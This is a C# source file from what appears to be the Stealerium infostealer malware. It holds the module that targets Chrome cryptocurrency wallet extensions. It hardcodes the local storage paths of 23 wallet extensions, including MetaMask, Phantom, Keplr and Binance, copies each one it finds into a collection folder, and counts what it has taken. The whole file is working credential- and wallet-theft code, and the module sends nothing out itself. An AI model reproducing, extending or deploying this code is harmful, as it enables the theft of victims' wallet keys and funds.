using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium;

internal class Extensions
{
	private static readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
	{
		new string[2]
		{
			"Chrome_Binance",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"
		},
		new string[2]
		{
			"Chrome_Bitapp",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"
		},
		new string[2]
		{
			"Chrome_Coin98",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"
		},
		new string[2]
		{
			"Chrome_Equal",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"
		},
		new string[2]
		{
			"Chrome_Guild",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"
		},
		new string[2]
		{
			"Chrome_Iconex",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"
		},
		new string[2]
		{
			"Chrome_Math",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"
		},
		new string[2]
		{
			"Chrome_Mobox",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"
		},
		new string[2]
		{
			"Chrome_Phantom",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"
		},
		new string[2]
		{
			"Chrome_Tron",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"
		},
		new string[2]
		{
			"Chrome_XinPay",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"
		},
		new string[2]
		{
			"Chrome_Ton",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"
		},
		new string[2]
		{
			"Chrome_Metamask",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
		},
		new string[2]
		{
			"Chrome_Sollet",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"
		},
		new string[2]
		{
			"Chrome_Slope",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"
		},
		new string[2]
		{
			"Chrome_Starcoin",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"
		},
		new string[2]
		{
			"Chrome_Swash",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"
		},
		new string[2]
		{
			"Chrome_Finnie",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"
		},
		new string[2]
		{
			"Chrome_Keplr",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"
		},
		new string[2]
		{
			"Chrome_Crocobit",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"
		},
		new string[2]
		{
			"Chrome_Oxygen",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"
		},
		new string[2]
		{
			"Chrome_Nifty",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"
		},
		new string[2]
		{
			"Chrome_Liquality",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"
		}
	};

	public static void GetChromeWallets(string sSaveDir)
	{
		try
		{
			Directory.CreateDirectory(sSaveDir);
			foreach (string[] chromeWalletsDirectory in ChromeWalletsDirectories)
			{
				CopyWalletFromDirectoryTo(sSaveDir, chromeWalletsDirectory[1], chromeWalletsDirectory[0]);
			}
			if (Counter.BrowserWallets == 0)
			{
				Filemanager.RecursiveDelete(sSaveDir);
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Chrome Browser Wallets >> Failed to collect wallets from Chrome browser\n" + ex);
		}
	}

	private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletName);
		if (Directory.Exists(sWalletDir))
		{
			Filemanager.CopyDirectory(sWalletDir, destFolder);
			Counter.BrowserWallets++;
		}
	}
}
